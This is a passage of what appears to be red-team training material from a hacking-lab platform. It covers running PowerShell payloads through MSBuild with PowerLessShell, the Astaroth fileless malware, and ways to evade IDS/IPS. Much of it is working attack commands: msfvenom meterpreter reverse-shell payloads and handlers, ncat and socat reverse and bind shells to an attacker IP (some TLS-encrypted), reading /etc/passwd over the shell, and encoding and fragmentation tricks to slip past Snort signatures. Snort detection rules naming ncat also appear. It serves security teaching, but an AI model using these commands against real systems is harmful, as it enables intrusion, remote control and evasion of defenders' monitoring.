application. Once the victim clicks on the Excel shortcut icon, the calc.exe is executed. For more information about shortcut modification, you may check [this](https://github.com/theonlykernel/atomic-red-team/blob/master/atomics/T1023/T1023.md) GitHub repo.

# No !

In 2019, Red Canary published a threat detection report stating that

PowerShell

is the most used technique for malicious activities. Therefore, Organizations started to monitor or block powershell.exe from being executed. As a result, adversaries find other ways to run

PowerShell

code without spawning it.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/239e633cdb273be86d1077949539cb38.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/239e633cdb273be86d1077949539cb38.png)

PowerLessShell
 is a Python-based tool that generates malicious code to run on a target
 machine without showing an instance of the PowerShell
 process. PowerLessShell relies on abusing the Microsoft Build Engine 
(MSBuild), a platform for building Windows applications, to execute 
remote code.

First, let's download a copy of the project from the GitHub repo onto the AttackBox:

Terminal

```
user@machine$ git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git
```

One of the project requirements is to get a PowerShell payload to make it suitable to work with MSBuild. On the AttackBox, we need to generate a PowerShell payload using msfvenom as follows:

Terminal

```
user@machine$ msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1
```

Also, we need to run the Metasploit framework to listen and wait for the reverse shell.

Terminal

```
user@machine$ msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost AttackBox_IP;set lport 4443;exploit"[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_winhttps
lhost => AttackBox_IP lport => 4443
[*] Started HTTPS reverse handler on https://AttackBox_IP:4443
```

Now that we have the payload ready, change to the PowerLessShell 
directory project to convert the payload to be compatible with the 
MSBuild tool. Then run the PowerLessShell tool and set the source file 
to the one we created with msfvenom as follows:

Terminal

```
user@machine$ python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
```

Once the command is executed successfully, we need to transfer the 
output file to the Windows machine. You can do this using the SCP command or set a web server to host the file on the AttackBox (python3 -m http.server 1337) and download the file using the browser.

Finally, on the target Windows machine, build the .csproj file and wait for the reverse shell!

Command Prompt!

```
C:\Users\thm> c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
```

Once we run the MSBuild command, wait a couple of seconds till we receive a reverse shell. Note that there will be no powershell.exe process is running.

**Real-life Scenario**

This task introduces a showcase of malware that used the techniques discussed in this room.

In 2017, The Windows Defender Advanced Threat Protection (

[Windows Defender ATP](https://www.microsoft.com/security/blog/2018/11/15/whats-new-in-windows-defender-atp/)

) Research Team discovered Fileless malware named

**Astaroth**

.
 A fileless malware means that the malware runs and is executed in the 
system without writing to disk. The malware performs all its functions 
from the victim device's memory.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/312a048b77af0ef89fab949cd9b753b4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/312a048b77af0ef89fab949cd9b753b4.png)

**Astaroth** is known as an **information stealer**,
 which takes sensitive information from victim users, such as account 
credentials, keystrokes, and other data, and sends it to the attacker. The
 malware relies on various advanced techniques such as anti-debugging, 
anti-virtualization, anti-emulation tricks, process hollowing, NTFS 
Alternate Data Streams (ADS), and Living off the land binaries to 
perform different functions.

In the initial access stage, attackers rely on a spam campaign that contains malicious attachment files. The attached file is an LNK file shortcut that, once the victim has clicked it, will result in the following:

- A **WMIC** command is executed to download and run Javascript code.
- Abusing the **BITSadmin** to download multiple binaries from the command and control server.
Interestingly, in some cases, the malware uses YouTube channel
descriptions to hide their C2 server commands.
- Using the BITSadmin, ADS technique, to hide their binaries within the system for their persistence.
- A **Certutil** tool is used to decode a couple of downloaded payloads into DLL files.
- The DLL files are executed using **Regsvr32**.

For more details about the malware and the detections, we suggest checking the following references:

1. [Astaroth: Banking Trojan](https://www.armor.com/resources/threat-intelligence/astaroth-banking-trojan/)
2. [Microsoft Discovers Fileless Malware Campaign Dropping Astaroth Info Stealer](https://www.trendmicro.com/vinfo/de/security/news/cybercrime-and-digital-threats/microsoft-discovers-fileless-malware-campaign-dropping-astaroth-info-stealer)
3. [Astaroth malware hides command servers in YouTube channel descriptions](https://www.zdnet.com/article/astaroth-malware-hides-command-servers-in-youtube-channel-descriptions/)

## **NETWORK SECURITY EVASIONS**

**NETWORK SECURITY SOLUTIONS**

An Intrusion Detection System (IDS)
 is a system that detects network or system intrusions. One analogy that
 comes to mind is a guard watching live feeds from different security 
cameras. He can spot a theft, but he cannot stop it by himself. However,
 if this guard can contact another guard and ask them to stop the 
robber, detection turns into prevention. An Intrusion Detection and 
Prevention System (IDPS) or simply Intrusion Prevention System (IPS) is a
 system that can detect and prevent intrusions.

Understanding the difference between *detection* and *prevention* is essential. Snort is a network intrusion detection and intrusion prevention system. Consequently, Snort can be set up as an IDS or an IPS. For Snort to function as an IPS, it needs some mechanism to block (`drop`) offending connections. This capability requires Snort to be set up as `inline` and to bridge two or more network cards.

As a signature-based network IDS, Snort is shown in the figure below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/112f5abb83ffd40a8ce514980242ce60.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/112f5abb83ffd40a8ce514980242ce60.png)

The following figure shows how Snort can be configured as an IPS if set up inline.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0925b08163ea115da03213b6fd846296.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0925b08163ea115da03213b6fd846296.png)

IDS setups can be divided based on their location in the network into:

1. Host-based IDS (HIDS)
2. Network-based IDS (NIDS)

The host-based IDS
 (HIDS) is installed on an OS along with the other running applications.
 This setup will give the HIDS the ability to monitor the traffic going 
in and out of the host; moreover, it can monitor the processes running 
on the host.

The network-based IDS
 (NIDS) is a dedicated appliance or server to monitor the network 
traffic. The NIDS should be connected so that it can monitor all the 
network traffic of the network or VLANs we want to protect. This can be 
achieved by connecting the NIDS to a monitor port on the switch. The 
NIDS will process the network traffic to detect malicious traffic.

In the figure below, we use two red circles to show the difference in the coverage of a HIDS versus a NIDS.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/61e14978e7f97e0de5d467babc3cfbff.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/61e14978e7f97e0de5d467babc3cfbff.png)

**IDS Engine Types**

We can classify network traffic into:

1. **Benign traffic**: This is the usual traffic that we expect to have and don’t want the IDS to alert us about.
2. **Malicious traffic**: This is abnormal traffic that we don’t expect to see under normal conditions and consequently want the IDS to detect it.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/ce5ea133da9aaa810b982e4745d4e635.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/ce5ea133da9aaa810b982e4745d4e635.png)

In the same way that we can classify network traffic, we can also classify host activity. The IDS
 detection engine is either built around detecting malicious traffic and
 activity or around recognizing normal traffic and activity. Recognizing
 “normal” makes it easy to detect any deviation from normal.

Consequently, the detection engine of an IDS can be:

1. **Signature-based**: A signature-based IDS requires full knowledge of malicious (or unwanted) traffic. In other
words, we need to explicitly feed the signature-based detection engine
the characteristics of malicious traffic. Teaching the IDS about
malicious traffic can be achieved using explicit rules to match against.
2. **Anomaly-based**: This requires the IDS to have knowledge of what regular traffic looks like. In other words,
we need to “teach” the IDS what normal is so that it can recognize what
is **not** normal. Teaching the IDS about normal traffic, i.e., baseline traffic can be achieved using machine learning or manual rules.

Put in another way, signature-based IDS
 recognizes malicious traffic, so everything that is not malicious is 
considered benign (normal). This approach is commonly found in 
anti-virus software, which has a database of known virus signatures. 
Anything that matches a signature is detected as a virus.

An anomaly-based IDS
 recognizes normal traffic, so anything that deviates from normal is 
considered malicious. This approach is more similar to how human beings 
perceive things; you have certain expectations for speed, performance, 
and responsiveness when you start your web browser. In other words, you 
know what “normal” is for your browser. If suddenly you notice that your
 web browser is too sluggish or unresponsive, you will know that 
something is wrong. In other words, you knew it when your browser’s 
performance deviated from normal.

**IDS/IPS Rule Triggering**

Each IDS/IPS has a certain syntax to write its rules. For example, Snort uses the following format for its rules: `Rule Header (Rule Options)`, where **Rule Header** constitutes:

1. Action: Examples of action include `alert`, `log`, `pass`, `drop`, and `reject`.
2. Protocol: `TCP`, `UDP`, `ICMP`, or `IP`.
3. Source IP/Source Port: `!10.10.0.0/16 any` refers to everything not in the class B subnet `10.10.0.0/16`.
4. Direction of Flow: `>` indicates left (source) to right (destination), while `<>` indicates bi-directional traffic.
5. Destination IP/Destination Port: `10.10.0.0/16 any` to refer to class B subnet `10.10.0.0/16`.

Below is an example rule to `drop` all ICMP traffic passing through Snort IPS:

`drop icmp any any -> any any (msg: "ICMP Ping Scan"; dsize:0; sid:1000020; rev: 1;)`

The rule above instructs the Snort IPS
 to drop any packet of type ICMP from any source IP address (on any 
port) to any destination IP address (on any port). The message to be 
added to the logs is “ICMP Ping Scan.”

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/b77e611870d301ecd622311ec1100d83.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/b77e611870d301ecd622311ec1100d83.png)

Let’s consider a hypothetical case where a vulnerability is 
discovered in our web server. This vulnerability lies in how our web 
server handles HTTP POST method requests, allowing the attacker to run system commands.

Let’s consider the following “naive” approach. We want to create a Snort rule that detects the term `ncat` in the payload of the traffic exchanged with our webserver to learn how people exploit this vulnerability.

`alert tcp any any <> any 80  (msg: "Netcat Exploitation"; content:"ncat"; sid: 1000030; rev:1;)`

The rule above inspects the content of the packets exchanged with port 80 for the string `ncat`. Alternatively, you can choose to write the content that Snort will scan for in hexadecimal format. `ncat` in ASCII is written as `6e 63 61 74` in hexadecimal and it is encapsulated as a string by 2 pipe characters `|`.

`alert tcp any any <> any 80  (msg: "Netcat Exploitation"; content:"|6e 63 61 74|"; sid: 1000031; rev:1;)`

We can further refine it if we expect to see it in HTTP POST requests. Note that `flow:established` tells the Snort engine to look at streams started by a TCP 3-way handshake (established connections).

`alert tcp any any <> any 80 (msg: "Netcat Exploitation"; 
flow:established,to_server; content:"POST"; nocase; http_method; 
content:"ncat"; nocase; sid:1000032; rev:1;)`

If ASCII logging is chosen, the logs would be similar to the two alerts shown next.

Snort Logs

```
[**] [1:1000031:1] Netcat Exploitation [**]
[Priority: 0]
01/14-12:51:26.717401 10.14.17.226:45480 -> 10.10.112.168:80
TCP TTL:63 TOS:0x0 ID:34278 IpLen:20 DgmLen:541 DF
***AP*** Seq: 0x26B5C2F  Ack: 0x0  Win: 0x0  TcpLen: 32

[**] [1:1000031:1] Netcat Exploitation [**]
[Priority: 0]
01/14-12:51:26.717401 10.14.17.226:45480 -> 10.10.112.168:80
TCP TTL:63 TOS:0x0 ID:34278 IpLen:20 DgmLen:541 DF
***AP*** Seq: 0x26B5C2F  Ack: 0xF1090882  Win: 0x3F  TcpLen: 32
TCP Options (3) => NOP NOP TS: 2244530364 287085341
```

There are a few points to make about signature-based IDS and its rules. If the attacker made even the slightest changes to avoid using `ncat` verbatim in their payload, the attack would go unnoticed. As we can conclude, a signature-based IDS
 or IPS is limited to how well-written and updated its signatures 
(rules) are. We discuss some evasion techniques in the next task.

**Evasion via Protocol Manipulation**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f93167e00799b371304a256e50a7850b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f93167e00799b371304a256e50a7850b.png)

Evading a signature-based IDS/IPS requires that you manipulate your 
traffic so that it does not match any IDS/IPS signatures. Here are four 
general approaches you might consider to evade IDS/IPS systems.

1. Evasion via Protocol Manipulation
2. Evasion via Payload Manipulation
3. Evasion via Route Manipulation
4. Evasion via Tactical Denial of Service (DoS)

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/3c82c010e4fe88cefb53991fd58c762a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/3c82c010e4fe88cefb53991fd58c762a.png)

This room focuses on evasion using `nmap` and `ncat`/`socat`. The evasion techniques related to Nmap are discussed in great detail in the [Firewalls](https://tryhackme.com/room/redteamfirewalls) room. This room will emphasize `ncat` and `socat` where appropriate.

We will expand on each of these approaches in its own task. Let’s 
start with the first one. Evasion via protocol manipulation includes:

- Relying on a different protocol
- Manipulating (Source) TCP/UDP port
- Using session splicing (IP packet fragmentation)
- Sending invalid packets

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/dba39db8e9ffe2adeae19a57e8fb01dd.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/dba39db8e9ffe2adeae19a57e8fb01dd.png)

### Rely on a Different Protocol

The IDS/IPS system might be configured to block certain protocols and allow others. For instance, you might consider using UDP
 instead of TCP or rely on HTTP instead of DNS to deliver an attack or 
exfiltrate data. You can use the knowledge you have gathered about the 
target and the applications necessary for the target organization to 
design your attack. For instance, if web browsing is allowed, it usually
 means that protected hosts can connect to ports 80 and 443 unless a 
local proxy is used. In one case, the client relied on Google services 
for their business, so the attacker used Google web hosting to conceal 
his malicious site. Unfortunately, it is not a one-size-fits-all; 
moreover, some trial and error might be necessary as long as you don’t 
create too much noise.

We have an IPS
 set to block DNS queries and HTTP requests in the figure below. In 
particular, it enforces the policy where local machines cannot query 
external DNS servers but should instead query the local DNS server; 
moreover, it enforces secure HTTP communications. It is relatively 
permissive when it comes to HTTPS. In this case, using HTTPS to tunnel 
traffic looks like a promising approach to evade the IPS.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/b42ec04cbb84ddd7c08f168be25c4215.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/b42ec04cbb84ddd7c08f168be25c4215.png)

Consider the case where you are using [Ncat](https://nmap.org/ncat). Ncat, by default, uses a TCP connection; however, you can get it to use UDP using the option `-u`.

- To listen using TCP, just issue `ncat -lvnp PORT_NUM` where port number is the port you want to listen to.
- to connect to an Ncat instance listening on a TCP port, you can issue `ncat TARGET_IP PORT_NUM`

Note that:

- `l` tells `ncat` to listen for incoming connections
- `v` gets more verbose output as `ncat` binds to a source port and receives a connection
- `n` avoids resolving hostnames
- `p` specifies the port number that `ncat` will listen on

As already mentioned, using `-u` will move all communications over UDP.

- To listen using UDP, just issue `ncat -ulvnp PORT_NUM` where port number is the port you want to listen to. Note that unless you add `u`, `ncat` will use TCP by default.
- To connect to an Ncat instance listening on a UDP port, you can issue `nc -u TARGET_IP PORT_NUM`

Consider the following two examples:

- Running `ncat -lvnp 25` on the attacker system and connecting to it will give the impression that it is a usual TCP connection with an SMTP server, unless the IDS/IPS provides deep packet inspection (DPI).
- Executing `ncat -ulvnp 162` on the attacker machine and connecting to it will give the illusion that it is a regular UDP communication with an SNMP server unless the IDS/IPS supports DPI.

### Manipulate (Source) TCP/UDP Port

Generally speaking, the TCP
 and UDP source and destination ports are inspected even by the most 
basic security solutions. Without deep packet inspection, the port 
numbers are the primary indicator of the service used. In other words, 
network traffic involving TCP port 22 would be interpreted as SSH 
traffic unless the security solution can analyze the data carried by the
 TCP segments.

Depending on the target security solution, you can make your port scanning traffic resemble web browsing or DNS queries. If you are using Nmap, you can add the option `-g PORT_NUMBER` (or `--source-port PORT_NUMBER`) to make Nmap send all its traffic from a specific source port number.

While scanning a target, use `nmap -sS -Pn -g 80 -F MACHINE_IP` to make the port scanning traffic appear to be exchanged with an HTTP server at first glance.

If you are interested in scanning UDP ports, you can use `nmap -sU -Pn -g 53 -F MACHINE_IP` to make the traffic appear to be exchanged with a DNS server.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0826134be47960f6466b84c0d5407654.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0826134be47960f6466b84c0d5407654.png)

Consider the case where you are using [Ncat](https://nmap.org/ncat). You can try to camouflage the traffic as if it is some DNS traffic.

- On the attacker machine, if you want to use Ncat to listen on UDP port 53, as a DNS server would, you can use `ncat -ulvnp 53`.
- On the target, you can make it connect to the listening server using `ncat -u ATTACKER_IP 53`.

Alternatively, you can make it appear more like web traffic where clients communicate with an HTTP server.

- On the attacker machine, to get Ncat to listen on TCP port 80, like a benign web server, you can use `ncat -lvnp 80`.
- On the target, connect to the listening server using `nc ATTACKER_IP 80`.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/b85668a256470594ea8a6310f68b5f86.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/b85668a256470594ea8a6310f68b5f86.png)

### Use Session Splicing (IP Packet Fragmentation)

Another approach possible in IPv4 is IP packet fragmentation, 
i.e., session splicing. The assumption is that if you break the 
packet(s) related to an attack into smaller packets, you will avoid 
matching the IDS
 signatures. If the IDS is looking for a particular stream of bytes to 
detect the malicious payload, divide your payload among multiple 
packets. Unless the IDS reassembles the packets, the rule won’t be 
triggered.

Nmap offers a few options to fragment packets. You can add:

- `f` to set the data in the IP packet to 8 bytes.
- `ff` to limit the data in the IP packet to 16 bytes at most.
- `-mtu SIZE` to provide a custom size for data carried within the IP packet. The size should be a multiple of 8.

Suppose you want to force all your packets to be fragmented into 
specific sizes. In that case, you should consider using a program such 
as [Fragroute](https://www.monkey.org/~dugsong/fragroute/). `fragroute`
 can be set to read a set of rules from a given configuration file and 
applies them to incoming packets. For simple IP packet fragmentation, it
 would be enough to use a configuration file with `ip_frag SIZE` to fragment the IP data according to the provided size. The size should be a multiple of 8.

For example, you can create a configuration file `fragroute.conf` with one line, `ip_frag 16`, to fragment packets where IP data fragments don’t exceed 16 bytes. Then you would run the command `fragroute -f fragroute.conf HOST`. The host is the destination to which we would send the fragmented packets it.

### Sending Invalid Packets

Generally speaking, the response of systems to valid packets tends to
 be predictable. However, it can be unclear how systems would respond to
 invalid packets. For instance, an IDS/IPS might process an invalid 
packet, while the target system might ignore it. The exact behavior 
would require some experimentation or inside knowledge.

Nmap
 makes it possible to create invalid packets in a variety of ways. In 
particular, two common options would be to scan the target using packets
 that have:

- Invalid TCP/UDP checksum
- Invalid TCP flags

Nmap lets you send packets with a wrong TCP/UDP checksum using the option `--badsum`. An incorrect checksum indicates that the original packet has been altered somewhere across its path from the sending program.

Nmap also lets you send packets with custom TCP flags, including invalid ones. The option `--scanflags` lets you choose which flags you want to set.

- `URG` for Urgent
- `ACK` for Acknowledge
- `PSH` for Push
- `RST` for Reset
- `SYN` for Synchronize
- `FIN` for Finish

For instance, if you want to set the flags Synchronize, Reset, and Finish simultaneously, you can use `--scanflags SYNRSTFIN`, although this combination might not be beneficial for your purposes.

If you want to craft your packets with custom fields, whether valid or invalid, you might want to consider a tool such as `hping3`. We will list a few example options to give you an idea of packet crafting using `hping3`.

- `t` or `-ttl` to set the Time to Live in the IP header
- `b` or `-badsum` to send packets with a bad UDP/TCP checksum
- `S`, `A`, `P`, `U`, `F`, `R` to set the TCP SYN, ACK, PUSH, URG, FIN, and RST flags, respectively

There is a myriad of other options. Depending on your needs, you might want to check the `hping3` manual page for the complete list.

**Evasion via Payload Manipulation**

Evasion via payload manipulation includes:

- Obfuscating and encoding the payload
- Encrypting the communication channel
- Modifying the shellcode

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/245004e9e2336cc06906009b969d330b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/245004e9e2336cc06906009b969d330b.png)

### Obfuscate and Encode the Payload

Because the IDS
 rules are very specific, you can make minor changes to avoid detection.
 The changes include adding extra bytes, obfuscating the attack data, 
and encrypting the communication.

Consider the command `ncat -lvnp 1234 -e /bin/bash`, where `ncat` will listen on TCP
 port 1234 and connect any incoming connection to the Bash shell. There 
are a few common transformations such as Base64, URL encoding, and 
Unicode escape sequence that you can apply to your command to avoid 
triggering IDS/IPS signatures.

### Encode to Base64 format

You can use one of the many online tools that encode your input to Base64. Alternatively, you can use `base64` commonly found on Linux systems.

Pentester Terminal

```
pentester@TryHackMe$ cat input.txtncat -lvnp 1234 -e /bin/bash
$ base64 input.txtbmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaA==
```

`ncat -lvnp 1234 -e /bin/bash` is encoded to `bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaA==`.

### URL Encoding

URL encoding converts certain characters to the form %HH, where HH is
 the hexadecimal ASCII representation. English letters, period, dash, 
and underscore are not affected. You can refer to [section 2.4 in RFC 3986](https://datatracker.ietf.org/doc/html/rfc3986#section-2.4) for more information.

One utility that you can easily install on your Linux system is `urlencode`;
 alternatively, you can either use an online service or search for 
similar utilities on MS Windows and macOS. To follow along on the 
AttackBox, you can install `urlencode` by running the command `apt install gridsite-clients`.

Pentester Terminal

```
pentester@TryHackMe$ urlencode ncat -lvnp 1234 -e /bin/bashncat%20-lvnp%201234%20-e%20%2Fbin%2Fbash
```

`ncat -lvnp 1234 -e /bin/bash` becomes `ncat%20-lvnp%201234%20-e%20%2Fbin%2Fbash` after URL encoding. Depending what the IDS/IPS signature is matching, URL encoding might help evade detection.

### Use Escaped Unicode

Some applications will still process your input and execute it 
properly if you use escaped Unicode. There are multiple ways to use 
escaped Unicode depending on the system processing the input string. For
 example, you can use [CyberChef](https://icyberchef.com/) to select and configure the Escape Unicode Characters recipe as shown in the image below.

1. Search for *Escape Unicode Characters*
2. Drag it to the *Recipe* column
3. Ensure you a check-mark near *Encode all chars* with a prefix of `\u`
4. Ensure you have a check-mark near *Uppercase hex* with a padding of 4

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f330a782dc93a8b227fc93231aa1649a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f330a782dc93a8b227fc93231aa1649a.png)

If you use the format `\uXXXX`, then `ncat -lvnp 1234 -e /bin/bash` becomes `\u006e\u0063\u0061\u0074\u0020\u002d\u006c\u0076\u006e\u0070\u0020\u0031\u0032\u0033\u0034\u0020\u002d\u0065\u0020\u002f\u0062\u0069\u006e\u002f\u0062\u0061\u0073\u0068`.
 It is clearly a drastic transformation that would help you evade 
detection, assuming the target system will interpret it correctly and 
execute it.

### Encrypt the Communication Channel

Because an IDS/IPS won’t inspect encrypted data, an attacker can take
 advantage of encryption to evade detection. Unlike encoding, encryption
 requires an encryption key.

One direct approach is to create the necessary encryption key on the attacker’s system and set `socat`
 to use the encryption key to enforce encryption as it listens for 
incoming connections. An encrypted reverse shell can be carried out in 
three steps:

1. Create the key
2. Listen on the attacker’s machine
3. Connect to the attacker’s machine

**Firstly**, On the AttackBox or any Linux system, we can create the key using `openssl`.

`openssl req -x509 -newkey rsa:4096 -days 365 -subj 
'/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key
 -out thm-reverse.crt`

The arguments in the above command are:

- `req` indicates that this is a certificate signing request. Obviously, we won’t submit our certificate for signing.
- `x509` specifies that we want an X.509 certificate
- `newkey rsa:4096` creates a new certificate request and a new private key using RSA, with the key size being 4096 bits. (You can
use other options for RSA key size, such as `newkey rsa:2048`.)
- `days 365` shows that the validity of our certificate will be one year
- `subj` sets data, such as organization and country, via the command-line.
- `nodes` simplifies our command and does not encrypt the private key
- `keyout PRIVATE_KEY` specifies the filename where we want to save our private key
- `out CERTIFICATE` specifies the filename to which we want to write the certificate request

The above command returns:

- Private key: `thm-reverse.key`
- Certificate: `thm-reverse.crt`

The Privacy Enhanced Mail (PEM) `.pem` file requires the concatenation of the private key `.key` and the certificate `.crt` files. We can use `cat` to create our PEM file from the two files that we have just created:

`cat thm-reverse.key thm-reverse.crt > thm-reverse.pem`.

**Secondly**, with the PEM file ready, we can start listening while using the key for encrypting the communication with the client.

`socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT`

If you are not familiar with `socat`, the options that we used are:

- `d -d` provides some debugging data (fatal, error, warning, and notice messages)
- `OPENSSL-LISTEN:PORT_NUM` indicates that the connection will be encrypted using OPENSSL
- `cert=PEM_FILE` provides the PEM file (certificate and private key) to establish the encrypted connection
- `verify=0` disables checking peer’s certificate
- `fork` creates a sub-process to handle each new connection.

**Thirdly**, on the victim system, `socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash`. Note that the `EXEC` invokes the specified program.

Let’s demonstrate this. On the attacker system, we carried out the following:

Pentester Terminal

```
pentester@TryHackMe$ openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crtGenerating a RSA private key
........................++++
......++++
writing new private key to 'thm-reverse.key'
-----
pentester@TryHackMe$ lsthm-reverse.crt  thm-reverse.key
pentester@TryHackMe$ cat thm-reverse.key thm-reverse.crt > thm-reverse.pempentester@TryHackMe$ socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT2022/02/24 13:39:07 socat[1208] W ioctl(6, IOCTL_VM_SOCKETS_GET_LOCAL_CID, ...): Inappropriate ioctl for device
2022/02/24 13:39:07 socat[1208] N listening on AF=2 0.0.0.0:4443
```

As we have a listener on the attacker system, we switched to the victim machine, and we executed the following:

Target Terminal

```
pentester@target$ socat OPENSSL:10.20.30.129:4443,verify=0 EXEC:/bin/bash
```

Back to the attacker system, let’s run `cat /etc/passwd`:

Pentester Terminal

```
pentester@TryHackMe$ socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT[...]
2022/02/24 15:54:28 socat[7620] N starting data transfer loop with FDs [7,7] and [1,1]

cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
[...]
```

However, if the IDS/IPS
 inspects the traffic, all the packet data will be encrypted. In other 
words, the IPS will be completely oblivious to exchange traffic and 
commands such as `cat /etc/passwd`. The screenshot below shows how things appear on the wire when captured using Wireshark. The highlighted packet contains `cat /etc/passwd`; however, it is encrypted.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/3352df7b863f48cfaf0aee8f308e95a9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/3352df7b863f48cfaf0aee8f308e95a9.png)

As you can tell, it is not possible to make sense of the commands or 
data being exchanged. To better see the value of the added layer of 
encryption, we will compare this with an equivalent `socat` connection that does not use encryption.

1. On the attacker’s system, we run `socat -d -d TCP-LISTEN:4443,fork STDOUT`.
2. On the victim’s machine, we run `socat TCP:10.20.30.129:4443 EXEC:/bin/bash`.
3. Back on the attacker’s system, we type `cat /etc/passwd` and hit Enter/Return.

Because no encryption was used, capturing the traffic exchanged 
between the two systems will expose the commands, and the traffic 
exchanged. In the following screenshot, we can see the command sent by 
the attacker.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/08f8e9b8cdae4878dab23cbb57dfbbe2.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/08f8e9b8cdae4878dab23cbb57dfbbe2.png)

Furthermore, it is a trivial task to follow the TCP
 stream as it is in cleartext and learn everything exchanged between the
 attacker and the target system. The screenshot below uses the “Follow 
TCP Stream” option from Wireshark.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/40f0e2f428db90b8b57d708d77eae99c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/40f0e2f428db90b8b57d708d77eae99c.png)

### Modify the data

Consider the simple case where you want to use Ncat to create a bind shell. The following command `ncat -lvnp 1234 -e /bin/bash` tells `ncat` to listen on TCP
 port 1234 and bind Bash shell to it. If you want to detect packets 
containing such commands, you need to think of something specific to 
match the signature but not too specific.

- Scanning for `ncat -lvnp` can be easily evaded by changing the order of the flags.
- On the other hand, inspecting the payload for `ncat -` can be evaded by adding an extra white space, such as `ncat -` which would still run correctly on the target system.
- If the IDS is looking for `ncat`, then simple changes to the original command won’t evade detection. We
need to consider more sophisticated approaches depending on the target
system/application. One option would be to use a different command such
as `nc` or `socat`. Alternatively, you can consider a different encoding if the target system can process it properly.

**Evasion via Route Manipulation**

Evasion via route manipulation includes:

- Relying on source routing
- Using proxy servers

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/d0e4bdf9c029c7efa74b9962b3a42010.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/d0e4bdf9c029c7efa74b9962b3a42010.png)

### Relying on Source Routing

In many cases, you can use source routing to force the packets to use a certain route to reach their destination. Nmap provides this feature using the option `--ip-options`. Nmap offers loose and strict routing:

- Loose routing can be specified using `L`. For instance, `-ip-options "L 10.10.10.50 10.10.50.250"` requests that your scan packets are routed through the two provided IP addresses.
